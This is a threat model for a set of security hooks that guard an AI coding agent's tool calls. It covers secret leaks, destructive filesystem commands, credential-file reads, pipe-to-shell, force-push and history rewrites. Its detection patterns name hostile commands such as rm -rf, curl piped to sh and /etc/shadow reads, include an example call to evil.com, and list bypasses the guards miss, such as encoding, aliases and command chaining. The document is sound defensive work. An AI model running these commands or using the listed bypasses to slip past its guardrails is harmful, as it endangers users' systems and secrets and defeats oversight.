# Threat Model

> Status: Plans 1-3 covered. T-001 through T-009 documented; T-004 fully covered. T-010 to T-018 populate as their hooks ship in Plans 4-5.

## Trust Boundaries

1. User prompt to Claude Code process
2. Claude Code to tool invocations (Bash, Edit, Write, WebFetch, MCP)
3. Tool to host filesystem / network / credentials
4. Subagent and parent agent
5. Local settings and managed settings

## Threat Register

### T-001: Secret Leak via Tool Output

- **Vector:** Bash, Read, MCP tools (input or output)
- **STRIDE:** Information Disclosure
- **Agentic Top 10:** A4 Sensitive Information Disclosure
- **Default mitigations:**
  - `secret-guard` (PreToolUse, block) detects secret literals in Bash command and env-dump patterns including bare `env` / `printenv`.
  - `secret-leak-detector` (PostToolUse, block) scans tool stdout/stderr/output for secret patterns. Truncates very large output to 256KB before scanning.
  - `keychain-guard` (PreToolUse, block) blocks macOS keychain CLI invocations that include value-printing flags. Existence checks pass through.
  - `mcp-secret-guard` (PreToolUse, block) scans MCP tool input payloads for secret literals.
- **Coverage:** baseline, strict, regulated profiles.
- **Known limitations:** custom secret formats not yet covered (extensible via `SECRET_PATTERNS`); base64-encoded or chunked secrets not detected.

### T-002: Destructive Filesystem Op

- **Vector:** Bash, Edit, Write
- **STRIDE:** Tampering
- **Agentic Top 10:** A6 Excessive Agency
- **Default mitigations:**
  - `destructive-fs-guard` (PreToolUse, block) matches `rm -rf` of root or HOME, `mkfs`, `dd` writing to a device, `shred -u`.
  - `dotfile-guard` (PreToolUse, severity warn on baseline / block on strict and regulated) flags Edit/Write to shell rc files, gitconfig, ssh config. Defends against persistence (PATH injection, alias hijack).
  - Plan 1 deny patterns from `overlays/destructive.json` provide an additional layer for the same patterns.
- **Coverage:** baseline (warn for dotfile), strict, regulated.
- **Known limitations:** does not detect symlink attacks or filesystem-level race conditions. Heredoc bodies not parsed.

### T-003: Credential File Exfil

- **Vector:** Read, Bash
- **STRIDE:** Information Disclosure
- **Agentic Top 10:** A4 Sensitive Information Disclosure
- **Default mitigations:**
  - `sensitive-paths-guard` (PreToolUse, block) hook-side check on Read and Bash for paths matching `/.ssh/`, `/.aws/`, `/.gnupg/`, `/.kube/`, `/.docker/`, `/.netrc`, GitHub CLI hosts file, `/etc/sudoers`, `/etc/shadow`.
  - Deny patterns in `overlays/secrets.json` and `overlays/sensitive-paths.json` enforce the same boundaries at the permission layer.
- **Coverage:** baseline, strict, regulated.
- **Known limitations:** symlink-following not detected. New credential dirs (e.g., future cloud providers) require updating `SENSITIVE_PATH_FRAGMENTS`.

### T-004: Force-Push / Branch Sabotage

- **Vector:** Bash (git CLI)
- **STRIDE:** Tampering
- **Agentic Top 10:** A6 Excessive Agency
- **Default mitigations:**
  - `git-destructive-guard` (PreToolUse, severity warn on baseline / block on strict and regulated) catches `git reset --hard`, `git clean -fd`, `git push --force`, `git push -f`, `git branch -D` on protected branches, `git rebase -i`.
  - `branch-protection-guard` (PreToolUse, severity warn on baseline / block on strict and regulated) catches `git commit --no-verify`, `git commit --no-gpg-sign`, and direct push to protected branches (main/master/release/develop/prod/production) when `CCSEC_ALLOW_PROTECTED_PUSH` is unset.
  - `commit-amend-pushed-guard` (PreToolUse, severity warn on baseline / block on strict and regulated) flags every `git commit --amend` invocation; user dismisses on baseline when amending unpushed work.
  - Deny patterns in `overlays/destructive.json` enforce the forced-push boundary at the permission layer.
- **Coverage:** baseline (warn), strict (block), regulated (block). Fully covered as of Plan 3.
- **Known limitations:** detection relies on argument string matching; obfuscated invocations (aliases, function wrappers, env-set flags) may bypass. The amend guard cannot reliably distinguish "already pushed" from "local-only" amends; it warns on every amend.

### T-005: Supply Chain via Submodule

- **Vector:** Edit, Write, Bash (git CLI)
- **STRIDE:** Tampering, Supply Chain
- **Agentic Top 10:** A3 Supply Chain Attacks
- **Default mitigations:**
  - `submodule-injection-guard` (PreToolUse, block) blocks Edit/Write to any `.gitmodules` file and Bash invocations of `git submodule add` or `git submodule update`.
  - Deny patterns in `overlays/branch-guards.json` enforce the boundary at the permission layer (Edit/Write on `*.gitmodules`).
- **Coverage:** baseline, strict, regulated.
- **Known limitations:** does not inspect submodule URLs for trust; trust is binary (block any add/update). Existing submodules already in the working tree are not blocked from being inspected. `git submodule status` and read-only operations pass through.

### T-006: Pipe-to-Shell Remote Execution

- **Vector:** Bash
- **STRIDE:** Elevation of Privilege
- **Agentic Top 10:** A6 Excessive Agency
- **Default mitigations:**
  - `pipe-to-shell-guard` (PreToolUse, block) narrow regex match on `| sh`, `| bash`, `| zsh`, `| fish`, `| ksh`. Always blocks across profiles.
  - `bash-structural-guard` (PreToolUse, severity warn on baseline / block on strict and regulated) detects `pipe_to_shell` as a structural risk kind. Redundant with pipe-to-shell-guard for this kind but provides defense-in-depth and detects unicode-lookalike pipe variants (U+FF5C).
  - Deny patterns in `overlays/bash-structural.json` enforce `Bash(curl * | sh|bash)`, `Bash(wget * | sh|bash)` at the permission layer.
- **Coverage:** baseline, strict, regulated.
- **Known limitations:** does not match heredoc-piped scripts or multi-stage piping that obscures the final shell invocation. Encoded payloads (base64-decoded then piped) are not detected.

### T-007: Command Chaining Bypass

- **Vector:** Bash
- **STRIDE:** Elevation of Privilege
- **Agentic Top 10:** A6 Excessive Agency
- **Default mitigations:**
  - `bash-structural-guard` (PreToolUse) surfaces `chained_and`, `chained_or`, `chained_semicolon`, and `leading_cd` as structural risks for the audit trail but does NOT block them by default. These are everyday shell idioms; blocking would be too aggressive.
  - The risks are written to the audit log so reviewers can investigate post-hoc.
- **Coverage:** audit-only (all profiles).
- **Known limitations:** chaining can be used to launder a denied command into an allowed one (`safe_cmd && rm -rf $HOME`). The destructive part is caught by `destructive-fs-guard`, but more subtle laundering (e.g., chaining a benign curl with a write to a sensitive path) depends on downstream hooks catching the second component. Defense relies on the per-component matchers, not on blocking chaining itself.

### T-008: Git History Rewrite

- **Vector:** Bash (git CLI)
- **STRIDE:** Tampering
- **Agentic Top 10:** A6 Excessive Agency
- **Default mitigations:**
  - `git-history-rewrite-guard` (PreToolUse, block) regex-matches `git filter-branch`, `git filter-repo`, `bfg --strip-blobs`, `git replace`, and `git update-ref HEAD|refs/heads/*`. Always blocks across profiles.
  - Deny patterns in `overlays/branch-guards.json` enforce `Bash(git filter-branch *)` and `Bash(git filter-repo *)` at the permission layer.
- **Coverage:** baseline, strict, regulated.
- **Known limitations:** does not detect lower-level plumbing commands that rewrite history without using these high-level tools (e.g., `git commit-tree` chains, manual ref manipulation through alternate refs). BFG variants beyond `--strip-blobs` are not all enumerated.

### T-009: Arbitrary Code via eval / Command Substitution

- **Vector:** Bash
- **STRIDE:** Elevation of Privilege
- **Agentic Top 10:** A6 Excessive Agency
- **Default mitigations:**
  - `bash-structural-guard` (PreToolUse, severity warn on baseline / block on strict and regulated) detects `command_substitution` (`$(...)` and backticks) and `process_substitution` (`<(...)` and `>(...)`) as structural risk kinds. Also flags unicode-lookalike dollar (U+FF04).
- **Coverage:** baseline (warn), strict (block), regulated (block).
- **Known limitations:** the parser does not evaluate substitutions; it only detects their syntactic presence. A benign `echo $(date)` is flagged the same as `echo $(curl evil.com/key)`. Users on baseline see warnings; users on strict/regulated need to refactor to direct invocations or whitelist via configuration.

## Explicit Non-Goals

- Not a sandbox.
- Not a runtime jail.
- Not a network firewall.
- Not a remote management system.
